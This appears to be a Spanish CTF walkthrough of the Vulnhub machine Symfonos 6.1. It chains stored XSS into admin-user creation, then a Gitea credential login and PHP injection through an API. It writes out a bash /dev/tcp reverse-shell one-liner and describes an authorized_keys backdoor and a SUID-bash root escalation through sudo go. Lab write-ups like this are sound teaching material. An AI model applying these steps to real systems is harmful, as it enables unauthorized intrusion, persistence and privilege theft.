--- 
title: "Symphonos6.1"
platform: "Vulnhub" 
date: "2026-02-27" 
difficulty: "Hard" 
os: "linux" 
description: "Resolución de la máquina Analysis de Vulhub." 
---
#linux 

------------------------------------
Lo primero que hacemos es un escaneo de puertos:
![[Pasted image 20240507232052.png]]

Vemos que esta el puerto 80 y el puerto 3000 abiertos exploramos la web:
![[Pasted image 20240507233451.png]]
En el puerto 80 solo aparece esta imagen.
En el puerto 3000:
![[Pasted image 20240507233530.png]]
Nos aparece como instalar la herramienta symphonos6, vamos a lanzar un dirsearch al puerto 80 haber si encontramos alguna ruta:
![[Pasted image 20240507233702.png]]

Vamos a ver que es lo que hay en este recurso:
![[Pasted image 20240507233749.png]]

También hemos visto que la versión de SSH es una versión un tanto antigua por lo que vamos a buscar haber si hay algún exploit:
![[Pasted image 20240508000321.png]]Hay pero no funciona en cualquier caso no íbamos a encontrar una vía por ahí.

Por lo que vamos a lanzar un diccionario mas grande para fuzzear la web por el puerto 80, haber si encontramos alguna ruta mas:
![[Pasted image 20240508000937.png]]Encontramos una ruta mas, por lo que vamos haber que es lo que hay en este recurso:
![[Pasted image 20240508001502.png]]

#xss 
Vamos a buscar haber si hay algún posible exploit de esto:
![[Pasted image 20240508004258.png]]
Vemos que hay varios XSS en la pagina, por lo que vamos a investigar para intentar explotarlo, uno de los que hemos encontrado es el siguiente:
![[Pasted image 20240520135410.png]]
En el realname si pones una etiqueta de script y luego subes un comentario en el único bug report que contiene la maquina:
![[Pasted image 20240520135532.png]]

>Como vemos el usuario admin de la pagina dice que esta revisando estos comentarios frecuentemente por lo que si en el real name que es el que sale en cada comentario podemos añadir las etiquetas script es posible que podamos ejecutar un CSRF, con el html que hemos encontrado con searsploit:

![[Pasted image 20240520202241.png]]

Esta estructura lo que hace es crear un usuario con privilegios de administrador como el que lee los comentarios que subimos.

Ahora vamos a probar que exista el XSS en el campo realname:
![[Pasted image 20240520155352.png]]

>Le tenemos que añadir '">' antes de la etiqueta ya que debe de estar haciendo algún tipo de comparación para sanitizar esto pero no la esta aplicando bien y metiendo estos caracteres debemos de estar saltándonos la condición.

Si guardamos y recargamos vamos a ver como nos salta la alerta:
![[Pasted image 20240520155425.png]]Si nos vamos ahora y escribimos un comentario el nombre que sale reconociéndonos es el que esta en realname por lo que es posible que al admin también se le cargue la alerta después de que inyectemos un comentario cualquiera:
![[Pasted image 20240520155759.png]]
![[Pasted image 20240520160941.png]]
Por lo que si ahora nos creamos un recurso .js con el contenido del html que crea un usuario nuevo e inyectamos una etiqueta script que haga una llamada a este recurso cuando el admin acceda a los comentarios y cargue el código en .js el que va hacer la petición va a ser el y como el si tienen permisos, nos creara un usuario admin con la contraseña que le hayamos indicado.

Creamos un archivo pwned.js con el contenido del html:
![[Pasted image 20240520202129.png]]
>Corregimos esas dos líneas que vienen mal en el script.

Inyectamos esto en el realname:
![[Pasted image 20240520195106.png]]

Inyectamos un comentario en el que aparezca este realname:
![[Pasted image 20240520195249.png]]Como vemos nos llegan peticiones:
![[Pasted image 20240520195324.png]]Vamos a desloguearnos y a conectarnos con el usuario que hemos puesto en la estructura html:
![[Pasted image 20240520202410.png]]
>Como vemos nos sale una tarea que antes no veíamos y nos ha dejado logguearnos con el usuario que habíamos puesto hacker:12345678.

En la tarea nos da las credenciales para entrar al gitea que hemos visto anteriormente en el puerto 3000:
![[Pasted image 20240520202538.png]]

Comprobamos que sean validas las credenciales:
![[Pasted image 20240520202728.png]]Como vemos hemos podido logguearnos en el gitea del puerto 3000.

Esto es como una especie de github ya que contiene respositorios, por lo que vamos a explorar que es lo que hay en el repositorio:
![[Pasted image 20240527191152.png]]
Vemos que esta el código que parece estar corriendo por el puerto 80 de la maquina, vemos la parte del front, y de las conexiones con la base de datos:
![[Pasted image 20240527191522.png]]![[Pasted image 20240527191548.png]]
>Con estos datos tratamos de conectarnos a su base de datos remotamente, por si no tuviera desactivado esta opción.

Ahora vamos a ver la api, lo primero que vemos es el main.go:
![[Pasted image 20240527193333.png]]
Vemos que el puerto lo coge de una variable de entorno por lo que vamos a ver por donde corre la api:
![[Pasted image 20240527193430.png]]
Corre por el puerto 5000, y cuelga de la siguiente ruta:
![[Pasted image 20240527193710.png]]


En la carpeta de la versión 1.0 encontramos lo siguiente:

![[Pasted image 20240527192225.png]]

Aquí vemos que si hacemos una petición por GET a la ruta ping del blog nos va a devolver un mensaje que indica la palabra PONG, vamos a probar haber si podemos, haciéndole una petición a la siguiente ruta: 'http://ip:5000/ls2o4g/v1.0/ping':
![[Pasted image 20240527194204.png]]

Encontramos mas rutas explorando la api:
![[Pasted image 20240527194444.png]]![[Pasted image 20240527194533.png]]
Tenemos que hacer una peticion por POST a esta ruta con un usuario y una contraseña en formato JSON, ademas nos genera un JWT:
![[Pasted image 20240527194839.png]]
Como podemos ver si enviamos una petición por post a este endpoint de la api:
![[Pasted image 20240528182814.png]]
Vemos que con la petición por POST no nos ha devuelto ningún output, por lo que si ha encontrado el endpoint pero no le hemos metido ningún user ni password, por lo que vamos a intentar conectarnos con el usuario achilles para que nos genere el JWT:
![[Pasted image 20240528184723.png]]
Como vemos nos ha generado el token haciendo la petición y enviándole un usuario y una contraseña valida.
Trataríamos de intentar romperlo pero no tenemos la key para descifrarlo, por lo que en este caso no vamos a poder.
Por lo que ahora vamos a ver la otra ruta de posts de la api, haciéndole una petición por GET:
![[Pasted image 20240528185755.png]]
Vemos que podemos ver el posts que vemos en la web.

Si volvemos a mirar la parte de posts.go que había en el repositorio:
![[Pasted image 20240528190241.png]]
Vemos que hay un metodo llamado PATCH que parece servir para actualizar el posts que aparece en la pagina:
![[Pasted image 20240528190349.png]]
Por lo que ahora vamos a tratar de actualizar el post haber si podemos inyectar algún comando.
Intentamos actualizar el posts, para ello tendremos que arrastrar el JWT:
![[Pasted image 20240528191759.png]]
Como vemos hemos podido actualizar el posts que hay en la pagina por lo que vamos a comprobarlo:
![[Pasted image 20240528191832.png]]

Ahora vamos a intentar inyectar php haber si nos lo ejecuta:

![[Pasted image 20240528211429.png]]

![[Pasted image 20240528211500.png]]

Como vemos a ejecutado el comando, ahora podríamos intentar entablarnos una reverse shell pero como hay que ejecutar un comando con muchos caracteres especiales nos va a dar problemas por lo que vamos a emplear filtros.
Por ejemplo vamos a utilizar el siguiente filtro file_put_contents('archivo.txt', 'Lo que quieres meter en el archivo'); por ejemplo:
![[Pasted image 20240528211941.png]]![[Pasted image 20240528211957.png]]

![[Pasted image 20240528212016.png]]

Como vemos hemos conseguido crear un archivo con el contenido que le hemos indicado en el servidor de la maquina a la que estamos atacando por lo que vamos a utilizar le siguiente filtro, ya que aunque metamos el comando en el texto que queremos meter en el archivo nos van a seguir dando problemas las comillas y demas, por lo que con el siguiente filtro base64_decode(), y en esta función inyectamos el siguiente contenido en base64:
![[Pasted image 20240528212614.png]]

Este código en base64 lo metemos en el filtro:
![[Pasted image 20240528212811.png]]
![[Pasted image 20240528212830.png]]![[Pasted image 20240528212909.png]]

Como vemos nos ha ejecutado el comando, gracias a que hemos podido subir el archivo con el base64 para que no nos den problemas los caracteres especiales, y con el filtro para decodearlo una vez subido y que lo interprete el navegador, por lo que ahora si que nos podemos entablar una reverse shell:

onelilner:
```bash
	bash -c "bash -i >%26 /dev/tcp/ip/puerto 0>%261"	
```

![[Pasted image 20240528213242.png]]
![[Pasted image 20240528213311.png]]
Como vemos hemos podido entablarnos la reverse shell.
Ahora hacemos el tratamiento de la tty y intentamos escalar privilegios.
Lo primero que vemos es que no estamos como el usuario achilles, por lo que vamos a probar a cambiarnos de usuario con las credenciales que ya tenemos:
![[Pasted image 20240528215227.png]]
Para crear un backdoor podría  borrar el athorized_keys y crear uno nuestro con la clave publica que sea nuestra, y le damos el permiso chmod 600, y asi nos podriamos crear un backdoor.

Lo primero que tenemos que hacer para poder escalar privilegios es mirar que permisos a nivel de sudoers tiene:
![[Pasted image 20240528220457.png]]
Vemos que tiene permisos de root para ejecutar go, por lo que podemos buscar lo siguiente:
https://zetcode.com/golang/exec-command/

Nos creamos un archivo que nos ejecute lo siguiente:
![[Pasted image 20240528225103.png]]

Cuando lo ejecute el usuario achilles como lo ejecuta con privilegios de root nos dará el privilegio SUID al binario de bash y cuando ejecutemos el comando bash -p nos arrastrara los privilegios del usuario propietarios que es root y nos dará una consola con este.

